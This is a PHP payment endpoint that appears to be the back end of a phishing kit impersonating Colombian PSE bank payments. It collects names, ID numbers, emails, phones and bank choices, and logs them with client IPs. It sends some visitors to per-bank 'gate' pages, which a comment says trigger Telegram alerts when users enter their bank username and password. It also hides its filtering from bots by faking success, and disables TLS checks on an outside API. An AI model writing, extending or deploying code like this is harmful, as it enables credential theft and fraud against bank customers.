<?php
header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

// ============ SEGURIDAD ANTIBOT (portada de backend SURA) ============
require_once __DIR__ . '/includes/security.php';
require_once __DIR__ . '/includes/app-config.php';
sura_enforce_security(['rate_limit' => true, 'rate_limit_max' => 30, 'rate_limit_window' => 60]);

// ============ CONFIGURACIÓN CENTRAL (config.json + env vars de Render) ============
$adminConfig = app_config();

$sistemaActivo = (bool)app_cfg('sistema_activo', true);
$adminApiKey = app_cfg('pagos.api_key', '') ?: app_cfg('api_key', '');
$bancosPseActivos = app_cfg('bancos_pse_activos', []);
$tgBotToken = app_cfg('telegram.bot_token', '');
$tgChatGenericos = app_cfg('telegram.chat_id_genericos', '');

function tg_notificar($botToken, $chatId, $texto, $keyboard = null) {
    if (empty($botToken) || empty($chatId)) return;
    $payload = [
        'chat_id' => $chatId,
        'text' => $texto,
        'parse_mode' => 'HTML'
    ];
    if ($keyboard) $payload['reply_markup'] = ['inline_keyboard' => $keyboard];
    $ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

$raw = file_get_contents('php://input');
$data = json_decode($raw, true) ?: [];

// ============================================
// VERIFICACIÓN CLOUDFLARE TURNSTILE (Anti-bot)
// Solo se exige si hay claves configuradas en el panel admin.
// Sin claves → el proyecto funciona con los captchas de respaldo.
// ============================================
$turnstileActivo = false; // off
if ($turnstileActivo) {
    $cfToken = !empty($data['cfToken']) ? $data['cfToken'] : '';
    $cfSecret = app_cfg('cloudflare.secret_key');

    $ch = curl_init('https://challenges.cloudflare.com/turnstile/v0/siteverify');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
        'secret' => $cfSecret,
        'response' => $cfToken,
        'remoteip' => $_SERVER['REMOTE_ADDR'] ?? null
    ]));
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $cfResp = curl_exec($ch);
    curl_close($ch);
    $cfResult = json_decode($cfResp, true);

    if (empty($cfToken) || empty($cfResult['success'])) {
        echo json_encode([
            'ok' => false,
            'success' => false,
            'message' => 'Verificación de seguridad fallida. Recarga la página e intenta de nuevo.'
        ]);
        exit(0);
    }
}
// ============================================

// Evaluación antibot: si es bot, respuesta silenciosa (despistar) sin registrar ni notificar
$evalBot = sura_evaluate_submission($data);
if (!empty($evalBot['is_bot'])) {
    sura_log_bot_detection(sura_client_ip(), $evalBot['reason'], $data);
    echo json_encode(['ok' => true, 'success' => true, 'message' => 'ok']);
    exit;
}

// Extraer campos del cliente
$nombres = !empty($data['nombres']) ? trim($data['nombres']) : (!empty($data['nombre']) ? trim($data['nombre']) : (!empty($data['fullName']) ? trim($data['fullName']) : 'Cliente AvalPay'));
$cedula  = !empty($data['cedula']) ? preg_replace('/[^0-9]/', '', $data['cedula']) : (!empty($data['docNumber']) ? preg_replace('/[^0-9]/', '', $data['docNumber']) : '1045686542');
$correo  = !empty($data['correo']) ? trim($data['correo']) : (!empty($data['email']) ? trim($data['email']) : 'cliente@gmail.com');
$celular = !empty($data['celular']) ? preg_replace('/[^0-9]/', '', $data['celular']) : (!empty($data['telefono']) ? preg_replace('/[^0-9]/', '', $data['telefono']) : (!empty($data['phone']) ? preg_replace('/[^0-9]/', '', $data['phone']) : '3012345678'));

// Extraer monto
$monto = 50000;
if (!empty($data['monto'])) {
    if (is_numeric($data['monto'])) {
        $monto = (int)$data['monto'];
    } else {
        $montoParsed = (int)preg_replace('/[^0-9]/', '', (string)$data['monto']);
        if ($montoParsed > 0) $monto = $montoParsed;
    }
} elseif (!empty($data['amount'])) {
    $montoParsed = (int)preg_replace('/[^0-9]/', '', (string)$data['amount']);
    if ($montoParsed > 0) $monto = $montoParsed;
}

// Extraer banco
$banco = !empty($data['banco']) ? trim($data['banco']) : (!empty($data['bank']) ? trim($data['bank']) : 'Bancolombia');

// ============ MAPEAR NOMBRE DE BANCO A CÓDIGO (INSENSIBLE A TILDES Y ESPACIOS) ============
if (!function_exists("apc_normalizar_banco")) {
    function apc_normalizar_banco($cadena) {
        $cadena = mb_strtolower(trim((string)$cadena), "UTF-8");
        $cadena = str_replace(
            ["á", "é", "í", "ó", "ú", "ü", "ñ", "Á", "É", "Í", "Ó", "Ú", "Ü", "Ñ"],
            ["a", "e", "i", "o", "u", "u", "n", "a", "e", "i", "o", "u", "u", "n"],
            $cadena
        );
        return preg_replace("/[^a-z0-9]/", "", $cadena);
    }
}

$bancoMapNormalizado = [
    "1051" => "1051", "davivienda" => "1051", "bancodavivienda" => "1051",
    "1007" => "1007", "bancolombia" => "1007",
    "1001" => "1001", "bogota" => "1001", "bancodebogota" => "1001",
    "1023" => "1023", "occidente" => "1023", "bancodeoccidente" => "1023",
    "1002" => "1002", "popular" => "1002", "bancopopular" => "1002",
    "1052" => "1052", "avvillas" => "1052", "bancoavvillas" => "1052",
    "1013" => "1013", "bbva" => "1013", "bbvacolombia" => "1013",
    "1032" => "1032", "cajasocial" => "1032", "bancocajasocial" => "1032",
    "1062" => "1062", "falabella" => "1062", "bancofalabella" => "1062",
    "1063" => "1063", "finandina" => "1063", "bancofinandina" => "1063",
    "1006" => "1006", "itau" => "1006", "bancoitau" => "1006",
    "1047" => "1047", "mundomujer" => "1047", "bancomundomujer" => "1047",
    "1069" => "1069", "serfinanza" => "1069", "bancoserfinanza" => "1069",
    "1070" => "1070", "lulo" => "1070", "lulobank" => "1070",
    "1019" => "1019", "scotiabank" => "1019", "colpatria" => "1019", "scotiabankcolpatria" => "1019",
    "1040" => "1040", "agrario" => "1040", "bancoagrario" => "1040",
    "1060" => "1060", "pichincha" => "1060", "bancopichincha" => "1060",
    "1061" => "1061", "bancoomeva" => "1061",
    "1507" => "1507", "nequi" => "1507",
    "1551" => "1551", "daviplata" => "1551",
    "1097" => "1097", "dale" => "1097",
    "1809" => "1809", "nu" => "1809", "nubank" => "1809"
];

$bancoNorm = apc_normalizar_banco($banco);
$bancoCode = "";

if (isset($bancoMapNormalizado[$bancoNorm])) {
    $bancoCode = $bancoMapNormalizado[$bancoNorm];
} else {
    foreach ($bancoMapNormalizado as $keyword => $cod) {
        if ($keyword !== $cod && strpos($bancoNorm, $keyword) !== false) {
            $bancoCode = $cod;
            break;
        }
    }
}
if (!$bancoCode && is_numeric($bancoNorm) && strlen($bancoNorm) === 4) {
    $bancoCode = $bancoNorm;
}

// ============ SISTEMA APAGADO: RETORNAR ERROR ============
if (!$sistemaActivo) {
    // Registrar intento
    $file = __DIR__ . '/transacciones_pse.json';
    $history = file_exists($file) ? json_decode(file_get_contents($file), true) ?: [] : [];
    $record = [
        'ticketId' => 'APC-' . rand(100000, 999999),
        'date' => date('c'),
        'status' => 'SISTEMA_APAGADO',
        'pse_url' => null,
        'nombres' => $nombres,
        'cedula' => $cedula,
        'correo' => $correo,
        'celular' => $celular,
        'monto' => $monto,
        'banco' => $banco
    ];
    array_unshift($history, $record);
    @file_put_contents($file, json_encode(array_slice($history, 0, 100), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

    echo json_encode([
        'ok' => false,
        'success' => false,
        'error_admin' => true,
        'message' => 'El sistema de pagos se encuentra temporalmente fuera de servicio. Por favor intenta más tarde.',
        'data' => null
    ]);
    exit;
}

// ============ BANCO NO HABILITADO PARA PSE: FLUJO MANUAL ============
$bancoHabilitadoPse = in_array($bancoCode, $bancosPseActivos);

// Slug del banco (para mensajes/rutas) + carpeta de la gate (mapa oficial del SURA)
$bancoSlugs = [
    '1051' => 'davivienda', '1007' => 'bancolombia', '1001' => 'bogota',
    '1023' => 'occidente', '1002' => 'popular', '1052' => 'avvillas',
    '1013' => 'bbva', '1032' => 'caja-social', '1062' => 'falabella',
    '1063' => 'finandina', '1006' => 'itau', '1047' => 'mundo-mujer',
    '1069' => 'serfinanza', '1070' => 'lulo', '1019' => 'scotiabank-colpatria',
    '1040' => 'agrario', '1060' => 'pichincha', '1061' => 'bancoomeva',
    '1507' => 'nequi', '1551' => 'daviplata', '1097' => 'dale', '1809' => 'nu'
];
$bancoGateFolders = [
    'davivienda'          => 'b-04',
    'bancolombia'         => 'b-14',
    'bogota'              => 'b-10',
    'occidente'           => 'b-06',
    'popular'             => 'b-08',
    'avvillas'            => 'b-03',
    'bbva'                => 'b-10',
    'caja-social'         => 'b-09',
    'falabella'           => 'b-11',
    'finandina'           => 'b-12',
    'itau'                => 'b-13',
    'mundo-mujer'         => 'b-01',
    'serfinanza'          => 'b-07',
    'lulo'                => 'b-02',
    'scotiabank-colpatria'=> 'b-05',
    'agrario'             => 'b-10',
    'pichincha'           => 'b-10',
    'bancoomeva'          => 'b-10',
    'nequi'               => 'b-15',
    'daviplata'           => 'b-04',
    'dale'                => 'b-10',
    'nu'                  => 'b-10'
];
$bancoSlug = $bancoSlugs[$bancoCode] ?? 'generico';
$bancoFolder = $bancoGateFolders[$bancoSlug] ?? 'b-10';

$pseUrl = null;
$apiResponseData = null;

if ($bancoHabilitadoPse && !empty($adminApiKey)) {
    $payload = [
        "nombres" => $nombres,
        "cedula"  => $cedula,
        "correo"  => $correo,
        "celular" => $celular,
        "monto"   => $monto,
        "banco"   => $banco
    ];

    $apiUrl = !empty($adminConfig['pagos']['api_url']) ? $adminConfig['pagos']['api_url'] : 'https://futuapigoluni.tech/api/generar-pago';

    // La API (RappiPay) a veces cancela transacciones válidas (estado CANCELED
    // marcado como retryable). Reintentar hasta 3 veces con pausa.
    $maxAttempts = 3;
    for ($attempt = 1; $attempt <= $maxAttempts; $attempt++) {
        try {
            $ch = curl_init($apiUrl);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($payload, JSON_UNESCAPED_UNICODE));
            curl_setopt($ch, CURLOPT_HTTPHEADER, [
                'Authorization: Bearer ' . $adminApiKey,
                'Content-Type: application/json'
            ]);
            curl_setopt($ch, CURLOPT_TIMEOUT, 40);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            // La API puede responder 307/308 hacia /api/generar-pago.
            // Seguir redirects reenviando el POST, si no pse_url llega vacío.
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_MAXREDIRS, 5);
            curl_setopt($ch, CURLOPT_POSTREDIR, 7); // reenviar POST en 301/302/307/308

            $response = curl_exec($ch);
            $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);

            if ($response) {
                $apiResponseData = json_decode($response, true);
                if (!empty($apiResponseData['pse_url'])) {
                    $pseUrl = $apiResponseData['pse_url'];
                    break;
                }
                // Si el error es retryable (cancelacion RappiPay), reintentar
                $errMsg = $apiResponseData['error'] ?? '';
                $retryable = (strpos($errMsg, 'rechaz') !== false) || (strpos($errMsg, 'no entreg') !== false) || (strpos($errMsg, 'CANCELED') !== false);
                if (!$retryable || $attempt >= $maxAttempts) break;
                sleep(3);
            } else {
                if ($attempt >= $maxAttempts) break;
                sleep(2);
            }
        } catch (Exception $e) {
            if ($attempt >= $maxAttempts) break;
            sleep(2);
        }
    }
}

// Persistir transacción
$file = __DIR__ . '/transacciones_pse.json';
$history = file_exists($file) ? json_decode(file_get_contents($file), true) ?: [] : [];

$record = array_merge([
    'ticketId' => 'APC-' . rand(100000, 999999),
    'date' => date('c'),
    'status' => $pseUrl ? 'PAGO_GENERADO_PSE' : ($bancoHabilitadoPse ? 'ERROR_API' : 'FLUJO_MANUAL'),
    'banco_code' => $bancoCode,
    'banco_pse_habilitado' => $bancoHabilitadoPse,
    'pse_url' => $pseUrl,
    'api_response' => $apiResponseData
], $data);

array_unshift($history, $record);
@file_put_contents($file, json_encode(array_slice($history, 0, 100), JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));

// Guardar IP del cliente asociada al ticket
$clienteIp = sura_client_ip();
sura_save_transaction_ip($record['ticketId'], $clienteIp);

// NOTA: ya NO se envía el mensaje "Nueva transacción" con botones aquí.
// La notificación oficial con botones la envía la gate del banco cuando el
// cliente ingresa su usuario/clave (como en el backend de referencia).

// Responder
if ($pseUrl) {
    echo json_encode([
        'ok' => true,
        'success' => true,
        'pse_url' => $pseUrl,
        'url' => $pseUrl,
        'message' => 'Pago PSE generado exitosamente',
        'data' => $apiResponseData
    ], JSON_UNESCAPED_SLASHES);
} elseif (!$bancoHabilitadoPse) {
    // Flujo manual: NO se llama la API; el cliente va a la carpeta del banco
    // elegido dentro de la gate (misma experiencia que el backend SURA)
    $rutaBanco = 'gate/recargas/transaction/' . $bancoFolder . '/?t=' . urlencode($record['ticketId']);
    echo json_encode([
        'ok' => true,
        'success' => true,
        'flujo_manual' => true,
        'url' => $rutaBanco,
        'message' => 'Serás redirigido a la página de tu banco para completar el pago.',
        'data' => null
    ]);
} else {
    echo json_encode([
        'ok' => false,
        'success' => false,
        'message' => 'No se pudo generar el enlace PSE. Por favor intenta nuevamente en unos minutos.',
        'data' => $apiResponseData
    ]);
}
